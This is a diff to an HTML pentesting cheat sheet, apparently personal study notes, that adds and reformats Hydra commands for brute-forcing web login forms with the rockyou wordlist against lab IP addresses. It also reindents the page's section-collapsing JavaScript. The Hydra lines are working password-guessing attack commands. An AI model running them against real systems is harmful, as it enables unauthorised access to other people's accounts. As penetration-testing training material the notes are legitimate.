@@ -164,18 +164,17 @@
                     <li>Avoid generic words like <code>username</code> or <code>password</code></li>
                     <li>Use unique error messages from the application</li>
                 </ul>
-
+                <h3>Change port</h3>
+                <pre><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.158.29 -s 8089 http-post-form "/login.php:user=^USER^&pass=^PASS^&submit=Login:F=Password incorrect."
+</code></pre>
                 <h3>Verbose output</h3>
-                <pre><code>hydra -l user -P /usr/share/wordlists/rockyou.txt -vV 192.168.50.201 http-post-form \
-"/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed"</code></pre>
+                <pre><code>hydra -l user -P /usr/share/wordlists/rockyou.txt -vV 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed"</code></pre>
 
                 <h3>Limit tasks</h3>
-                <pre><code>hydra -l user -P /usr/share/wordlists/rockyou.txt -t 4 192.168.50.201 http-post-form \
-"/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed"</code></pre>
+                <pre><code>hydra -l user -P /usr/share/wordlists/rockyou.txt -t 4 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed"</code></pre>
 
                 <h3>Stop on success</h3>
-                <pre><code>hydra -l user -P /usr/share/wordlists/rockyou.txt -f 192.168.50.201 http-post-form \
-"/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed"</code></pre>
+                <pre><code>hydra -l user -P /usr/share/wordlists/rockyou.txt -f 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed"</code></pre>
 
                 <h3>Notes</h3>
                 <ul>
@@ -256,37 +255,37 @@
             resultsContainer.classList.remove("collapsed");
         }
         document.querySelectorAll(".sub-title").forEach(title => {
-                        const wrapper = document.createElement("div");
-                        wrapper.classList.add("sub-wrapper");
+            const wrapper = document.createElement("div");
+            wrapper.classList.add("sub-wrapper");
 
-                        const content = document.createElement("div");
-                        content.classList.add("sub-content");
+            const content = document.createElement("div");
+            content.classList.add("sub-content");
 
-                        // meter wrapper en el DOM justo antes del título
-                        title.parentNode.insertBefore(wrapper, title);
+            // meter wrapper en el DOM justo antes del título
+            title.parentNode.insertBefore(wrapper, title);
 
-                        // mover el título dentro del wrapper
-                        wrapper.appendChild(title);
+            // mover el título dentro del wrapper
+            wrapper.appendChild(title);
 
-                        // mover todo hasta el siguiente sub-title o section-header
-                        let next = wrapper.nextSibling;
+            // mover todo hasta el siguiente sub-title o section-header
+            let next = wrapper.nextSibling;
 
-                        while (
-                                next &&
-                                !(next.classList && (next.classList.contains("sub-title") || next.classList.contains("section-header")))
-                        ) {
-                                const temp = next.nextSibling;
-                                content.appendChild(next);
-                                next = temp;
-                        }
+            while (
+                next &&
+                !(next.classList && (next.classList.contains("sub-title") || next.classList.contains("section-header")))
+            ) {
+                const temp = next.nextSibling;
+                content.appendChild(next);
+                next = temp;
+            }
 
-                        wrapper.appendChild(content);
+            wrapper.appendChild(content);
 
-                        // toggle
-                        title.addEventListener("click", () => {
-                                wrapper.classList.toggle("active");
-                        });
-                });
+            // toggle
+            title.addEventListener("click", () => {
+                wrapper.classList.toggle("active");
+            });
+        });
     </script>
 
 </body>
